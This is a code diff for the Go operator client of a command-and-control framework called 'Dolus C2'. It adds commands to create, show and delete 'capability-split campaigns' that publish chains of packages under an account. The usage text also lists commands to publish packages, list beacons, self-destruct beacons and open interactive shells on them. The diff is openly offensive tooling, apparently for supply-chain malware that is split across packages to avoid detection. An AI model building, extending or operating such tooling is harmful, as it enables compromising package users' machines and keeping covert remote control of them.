@@ -458,6 +458,100 @@ shellLoop:
 
 const SESSION_COOKIE = "dolus_session"
 
+// ── campaigns ────────────────────────────────────────────────────────────────
+
+func cmdCampaigns(args []string) {
+	cfg := mustConfig()
+	if len(args) > 0 {
+		switch args[0] {
+		case "create":
+			cmdCampaignsCreate(cfg, args[1:])
+		case "show":
+			cmdCampaignsShow(cfg, args[1:])
+		case "delete", "rm":
+			cmdCampaignsDelete(cfg, args[1:])
+		default:
+			fatal("unknown subcommand: campaigns %s", args[0])
+		}
+		return
+	}
+
+	var rows []map[string]any
+	if err := apiJSON(cfg, "GET", "/api/campaigns", nil, &rows); err != nil {
+		fatal("%v", err)
+	}
+	if len(rows) == 0 {
+		fmt.Println("no campaigns")
+		return
+	}
+	fmt.Printf("%-4s  %-25s  %-15s  %-6s  %-8s  %-10s  %s\n", "ID", "NAME", "ACCOUNT", "DEPTH", "PKGS", "STATUS", "CREATED")
+	fmt.Println(strings.Repeat("─", 95))
+	for _, r := range rows {
+		fmt.Printf("%-4v  %-25s  %-15s  %-6v  %-8v  %-10s  %s\n",
+			r["id"], str(r, "name"), str(r, "account_name"),
+			r["depth"], r["package_count"], str(r, "status"), ts(r["created_at"]))
+	}
+}
+
+func cmdCampaignsCreate(cfg *Config, args []string) {
+	if len(args) < 2 {
+		fatal("usage: dolus campaigns create <name> <account_id> [depth]")
+	}
+	body := map[string]any{"name": args[0], "account_id": args[1]}
+	if len(args) > 2 {
+		body["depth"] = args[2]
+	}
+	var resp map[string]any
+	if err := apiJSON(cfg, "POST", "/api/campaigns", body, &resp); err != nil {
+		fatal("%v", err)
+	}
+	ok, _ := resp["success"].(bool)
+	if ok {
+		fmt.Println("campaign published")
+	} else {
+		fmt.Println("campaign partially published (some packages failed)")
+	}
+	if pkgs, ok := resp["packages"].([]any); ok {
+		for _, p := range pkgs {
+			row := p.(map[string]any)
+			fmt.Printf("  %-10s  %-30s  %s\n", str(row, "role"), str(row, "name"), str(row, "status"))
+		}
+	}
+}
+
+func cmdCampaignsShow(cfg *Config, args []string) {
+	if len(args) == 0 {
+		fatal("usage: dolus campaigns show <id>")
+	}
+	var r map[string]any
+	if err := apiJSON(cfg, "GET", "/api/campaigns/"+args[0], nil, &r); err != nil {
+		fatal("%v", err)
+	}
+	fmt.Printf("  %-12s  %v\n", "id", r["id"])
+	fmt.Printf("  %-12s  %s\n", "name", str(r, "name"))
+	fmt.Printf("  %-12s  %v\n", "depth", r["depth"])
+	fmt.Printf("  %-12s  %s\n", "status", str(r, "status"))
+	fmt.Printf("  %-12s  %s\n", "created", ts(r["created_at"]))
+
+	if pkgs, ok := r["packages"].([]any); ok && len(pkgs) > 0 {
+		fmt.Printf("\n  packages (%d):\n", len(pkgs))
+		for _, p := range pkgs {
+			row := p.(map[string]any)
+			fmt.Printf("    %-10s  %-30s  %s\n", str(row, "role"), str(row, "name"), str(row, "status"))
+		}
+	}
+}
+
+func cmdCampaignsDelete(cfg *Config, args []string) {
+	if len(args) == 0 {
+		fatal("usage: dolus campaigns delete <id>")
+	}
+	if err := apiJSON(cfg, "DELETE", "/api/campaigns/"+args[0], nil, nil); err != nil {
+		fatal("%v", err)
+	}
+	fmt.Println("campaign deleted (all packages unpublished)")
+}
+
 // ── helpers ───────────────────────────────────────────────────────────────────
 
 func mustConfig() *Config {
@@ -477,17 +571,22 @@ func usage() {
 	fmt.Print(`dolus — Dolus C2 CLI
 
 Usage:
-  dolus login <server>              authenticate (stores token in ~/.dolus.json)
-  dolus logout                      clear stored credentials
+  dolus login <server>                      authenticate (stores token in ~/.dolus.json)
+  dolus logout                              clear stored credentials
 
-  dolus packages                    list packages
-  dolus packages publish <name>     publish a package (add account_id as 2nd arg)
-  dolus packages delete <id>        delete and unpublish a package
+  dolus packages                            list packages
+  dolus packages publish <name>             publish a package (add account_id as 2nd arg)
+  dolus packages delete <id>                delete and unpublish a package
 
-  dolus beacons                     list active beacons
-  dolus beacons show <id>           show beacon details and heartbeat history
-  dolus beacons destroy <id>        queue beacon for self-destruction
-  dolus beacons shell <id>          open interactive shell on beacon
+  dolus campaigns                           list campaigns
+  dolus campaigns create <name> <acct> [d]  create and publish a capability-split campaign
+  dolus campaigns show <id>                 show campaign detail + package chain
+  dolus campaigns delete <id>               unpublish all packages and delete
+
+  dolus beacons                             list active beacons
+  dolus beacons show <id>                   show beacon details and heartbeat history
+  dolus beacons destroy <id>                queue beacon for self-destruction
+  dolus beacons shell <id>                  open interactive shell on beacon
 
 `)
 }
@@ -507,6 +606,8 @@ func main() {
 		cmdLogout(args)
 	case "packages", "pkg", "p":
 		cmdPackages(args)
+	case "campaigns", "campaign", "c":
+		cmdCampaigns(args)
 	case "beacons", "beacon", "b":
 		cmdBeacons(args)
 	case "help", "--help", "-h":
